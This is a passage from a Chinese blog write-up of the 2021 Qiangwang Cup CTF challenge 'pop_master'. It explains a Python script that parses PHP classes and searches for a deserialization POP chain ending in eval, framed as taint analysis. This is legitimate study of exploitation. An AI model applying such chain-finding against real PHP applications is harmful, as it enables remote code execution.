+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br></code></pre></td></tr></table></figure>
+
+<p>固定格式没啥说的，这一步的预处理是将所有的 <code>类</code> 和 <code>函数</code> 单独抽出来，分别作了 <code>类名=&gt;类节点</code> 和 <code>函数名=&gt;类名</code> 的字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断赋值操作是否可继续利用&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment			<span class="hljs-comment"># 判断为赋值操作</span><br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:	<span class="hljs-comment"># 判断改变的参数是否为所需参数</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:		<span class="hljs-comment"># 判断等号右边是否为 二元操作</span><br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:			<span class="hljs-comment"># 判断是否为 . 连接操作</span><br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:	<span class="hljs-comment"># 判断 . 左侧的是否为所需参数</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:	<span class="hljs-comment"># 判断是否为变量直接赋值</span><br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:	<span class="hljs-comment"># 判断等号右边是否为所需参数</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>
+
+<p> 判断 <strong>赋值操作</strong> 是否能够正常传递参数内容，即是否不 <strong>消毒</strong> </p>
+<ul>
+<li>若等号左侧不是所需参数，则赋值无影响，返回 True</li>
+<li>若等号右侧为 . 连接操作，且 . 的左侧是所需参数，则赋值相当于参数加后缀，不影响代码执行，返回True</li>
+<li>若等号右侧为 变量 且为所需参数，则赋值等同于转化，不影响代码执行，返回 True</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断if语句是否可用&quot;&quot;&quot;</span><br>    <br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node)== If			<span class="hljs-comment"># 节点类型为 if</span><br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:	<span class="hljs-comment"># if条件是否为二元操作</span><br>        <span class="hljs-comment"># 若二元操作的计算结果为真，且if代码块中有赋值操作，赋值操作消毒成功，则返回 False，否则均返回True</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>                <br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:	<span class="hljs-comment"># 是否为函数调用</span><br>        <span class="hljs-comment"># 此处由于题目生成规律，if条件中的函数调用只会检测是否存在，且检测后一定执行</span><br>        <span class="hljs-comment"># 先判断是否为预期情况，然后提取出打算调用的函数名，找到对应的类，并将所调用的参数一并传入search模块</span><br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>
+
+<p>判断if语句是否不影响代码执行</p>
+<ul>
+<li>题目中的if只有两种情况：判断二元操作并赋值，判断函数是否存在并调用</li>
+<li>针对二元操作，先判断能否进入代码块，在判断代码块里的赋值操作是否有效</li>
+<li>针对函数调用，直接进入目标类中搜寻被调函数，完成点到点的连接(最后形成调用链)</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;判断当前方法是否可用&quot;&quot;&quot;</span><br>    ctx.param = method.params[<span class="hljs-number">0</span>]	<span class="hljs-comment"># 暂时不清楚有啥用，看起来没用，但谁知道呢</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:			<span class="hljs-comment"># 一个函数里有多行代码，依次判断代码格式并触发相应结局</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:			<span class="hljs-comment"># for比较好处理，直接看赋值是否有效(因为题目只有赋值)</span><br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:			<span class="hljs-comment"># 调！调上面的模块</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:	<span class="hljs-comment"># 继续调！</span><br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:	<span class="hljs-comment"># 还在调！</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:		<span class="hljs-comment"># the end，拿到这个就结束</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>
+
+<p>判断当前的函数是否有效传递，类似于一行行读代码，每种情况调用相关的处理模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br></code></pre></td></tr></table></figure>
+
+<p>重头戏，深度优先算法找 pop链，每遇到一个被调函数就找到对应的类去尝试调用，通过上面的模块判断当前函数能否成功传递信息，直到返回 True，也就是找到 eval 函数。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br></code></pre></td></tr></table></figure>
+
+<p>到这一步就已经解决问题了，成功找到了一条调用链并打印出来，通过一个全局变量 <code>good_paths</code> 存储</p>
+<p>再往下就是自动生成 <code>payload</code> 和 自动提交，这也是佩服老学长的地方，偷懒都偷的无可挑剔，给的exp开箱即用，完全不需要二次处理，赞！</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>整体回顾，学长的exp可以从 <strong>污点分析</strong> 的角度来理解。</p>
+<p>污点分析定义：</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">污点分析可以抽象成一个三元组`&lt;sources,sinks,sanitizers&gt;`的形式,其中,source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中<span class="hljs-comment">;sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);sanitizer即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点.如果不能,说明系统是信息流安全的;否则,说明系统产生了隐私数据泄露或危险数据操作等安全问题.</span><br></code></pre></td></tr></table></figure>
+
+<p>这道题中，<code>source</code> 就是作者留下的反序列化入口，也就是 <code>dLEWX3</code> 类的 <code>L8IHXt</code> 方法接收的参数 ，<code>sink</code> 就是我们想实现的 <code>eval</code> 函数</p>
+<p><code>sanitizer</code> 则是过程中的各种操作(直接赋值，if后赋值，for内赋值)，而函数的相互调用过程就是污点的传播过程，而我们的 <code>good_paths</code> 里存的，就是一条可行的污点传播链(这可不good)</p>
+<p>exp中定义的各种模块就在做一件事：判断是否 <strong>消毒</strong> ，消毒了就返回 False，然后在 <code>search</code> 模块里把当前路径 pop 掉，然后进入下一条语句继续，直到找到完整的传播链或不可达。</p>
+<p>理解了后会发现这种题其实不难，虽然看起来类很多，但每个被调函数都只在唯一的类中声明，也就是从函数到类是具有唯一性的，这就避免了相互调用陷入循环的尴尬处境，最多会在同一个函数里出现两三个 <code>岔路口</code> , 其余时间都在前进和消毒，也正因为此，才可用较为简洁的代码完成题目。</p>
+<p>最后再次感谢老学长的帮助 😋</p>
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><p>[强网杯<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244153">pop_master]与[陀那多]赛题的出题记录-安全客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">python实现的php序列化 (frankli.site)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/279680.html">pop_master的花式解题思路 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://pypi.com.cn/project/phply/">phply - 使用 PLY 实现的 PHP 源的词法分析器和解析器_PyPI中文网</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264231">从一道题浅谈污点分析-安全客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/03/01/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/">简单理解污点分析技术 | K0rz3n’s Blog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AD%A6%E4%B9%A0/" class="print-no-link">#学习</a>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>21年强网杯pop_master</div>
+      <div>https://just1greed.github.io/2023/12/14/21年强网杯pop-master/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Greed</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月14日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月15日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/12/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-4/" title="vulnstack靶场日记-4">
+                        <span class="hidden-mobile">vulnstack靶场日记-4</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://cdn.staticfile.org/waline/2.15.5/waline.min.css')
+      Fluid.utils.createScript('https://cdn.staticfile.org/waline/2.15.5/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://comment.just1greed.online","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
